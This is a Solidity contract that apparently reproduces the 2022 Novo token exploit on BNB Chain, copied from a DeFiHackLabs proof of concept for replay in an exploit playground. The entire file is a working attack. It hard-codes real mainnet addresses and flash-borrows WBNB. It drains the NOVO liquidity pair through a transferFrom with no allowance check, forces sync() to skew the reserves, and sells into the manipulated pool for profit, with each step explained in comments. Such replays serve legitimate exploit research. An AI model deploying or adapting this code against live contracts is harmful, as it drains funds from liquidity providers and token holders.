// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2022-05-Novo).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// (the flash-swap callback `pancakeCall` lives on the test itself, so there is
// no standalone contract to deploy). This contract is a faithful, self-contained
// copy of that inline attack (testExploit + pancakeCall) so the playground can
// deploy it and record run(). Logic and constants are copied verbatim from
// test/Novo_exp.sol::ContractTest.
//
// VULNERABILITY (see sources/NOVO_a0787D/NOVO.sol:2939):
// Root cause: NOVO's transferFrom has its allowance check commented out, so
// anyone can move ANY holder's NOVO (including the AMM pair's) with no approval.
// A follow-up pair.sync() then forces the pair to accept the crippled balance as
// its new reserve, skewing the price ~100x, and the attacker dumps their own
// NOVO into the skewed pool for a large WBNB profit.
//
// Impact: Attacker extracts ~17+ WBNB profit (after fees) per run with only 10 WBNB seed capital.
// The LP pair loses the economic value represented by its drained NOVO reserve (sent to the NOVO token contract).
// Any holder of NOVO (or liquidity provider) is exposed because transferFrom is universally broken.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IWBNB {
    function deposit() external payable;
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IPancakePair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function sync() external;
}

interface IPancakeRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] memory path,
        address to,
        uint256 deadline
    ) external;
}

interface INOVOLP {
    function sync() external;
}

contract NovoDrain {
    // Constants copied verbatim from test/Novo_exp.sol::ContractTest.
    IPancakePair constant PancakePair = IPancakePair(0xEeBc161437FA948AAb99383142564160c92D2974);
    IPancakeRouter constant PancakeRouter = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    IWBNB constant wbnb = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    IERC20 constant novo = IERC20(0x6Fb2020C236BBD5a7DDEb07E14c9298642253333);
    INOVOLP constant novoLP = INOVOLP(0x128cd0Ae1a0aE7e67419111714155E1B1c6B2D8D);

    // The 10 WBNB seed the test wraps from msg.value at the start of testExploit.
    // Supplied as msg.value to run() (paired with setup.fundAttackerWei).
    uint256 private constant SEED_WBNB = 10 * 1e18;
    // Flash-swap principal (borrow 17.2 WBNB from the PancakePair).
    uint256 private constant BORROW_WBNB = 172 * 1e17;
    // transferFrom drain amount (copied verbatim from the PoC).
    uint256 private constant DRAIN_NOVO = 113_951_614_762_384_370;
    // Flash-swap repay fee: 4472 * 10e13 = 0.04472 WBNB (0.25% of 17.2 WBNB).
    uint256 private constant FEE_WBNB = 4472 * 10e13;

    // run() mirrors testExploit(): the 10 WBNB seed is pre-funded as WBNB during
    // setup (so the recorder baselines balanceBefore = 10 WBNB and measures net
    // profit), then flash-swap from the pair. The pancakeCall callback below does
    // the actual drain + sell + repay.
    function run() external payable {
        // EXPLOIT STEP 1: Flash-swap borrow 17.2 WBNB. Callback (pancakeCall) receives the funds
        // with the obligation to repay amount1 + fee before returning. No capital locked up front.
        // Borrow 17.2 WBNB; the callback data carries the pair + amount (unused
        // by the callback body, which uses the constants directly — kept verbatim).
        bytes memory data = abi.encode(0xEeBc161437FA948AAb99383142564160c92D2974, BORROW_WBNB);
        PancakePair.swap(0, BORROW_WBNB, address(this), data);
    }

    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
        // EXPLOIT STEP 2: Buy NOVO with the flash-borrowed WBNB at the fair pre-attack price.
        // This gives the attacker a NOVO balance that will later be sold at the manipulated price.
        // Approve the router to spend the borrowed WBNB and buy NOVO with it.
        address[] memory path = new address[](2);
        wbnb.approve(address(PancakeRouter), type(uint256).max);
        path[0] = address(wbnb);
        path[1] = address(novo);
        PancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            BORROW_WBNB, 1, path, address(this), block.timestamp
        );
        require(novo.balanceOf(address(this)) != 0, "Swap Failed");

        // EXPLOIT STEP 3: Drain the LP pair's NOVO balance using the vulnerable transferFrom.
        // THE BUG: transferFrom skips the allowance check, so anyone can move the
        // pair's NOVO with no approval. Drain ~99% of the pair's NOVO out of it.
        // See VULNERABILITY comment in sources/NOVO_a0787D/NOVO.sol around L2939.
        novo.transferFrom(address(novoLP), address(novo), DRAIN_NOVO);

        // EXPLOIT STEP 4: Call sync() to make the pair's reserves match the (now-drained) real balances.
        // Force the pair to accept the crippled balance as its new reserve —
        // reserve0 collapses ~100x while reserve1 (WBNB) is unchanged.
        // This breaks the constant-product invariant for subsequent swaps.
        novoLP.sync();

        // EXPLOIT STEP 5: Sell the attacker's NOVO holdings into the manipulated pool.
        // With reserve0 extremely low, the marginal price gives the attacker a huge WBNB payout.
        // Approve the pair and sell the attacker's NOVO into the now-skewed pool.
        novo.approve(address(PancakePair), novo.balanceOf(address(this)));
        path[0] = address(novo);
        path[1] = address(wbnb);
        PancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            novo.balanceOf(address(this)), 1, path, address(this), block.timestamp
        );
        require(wbnb.balanceOf(address(this)) > BORROW_WBNB, "Exploit Failed");

        // EXPLOIT STEP 6: Repay flash-swap (principal + fee). Profit stays with attacker.
        // Repay the flash swap: principal + 0.25% fee.
        wbnb.transfer(address(PancakePair), amount1 + FEE_WBNB);
    }

    receive() external payable {}
}
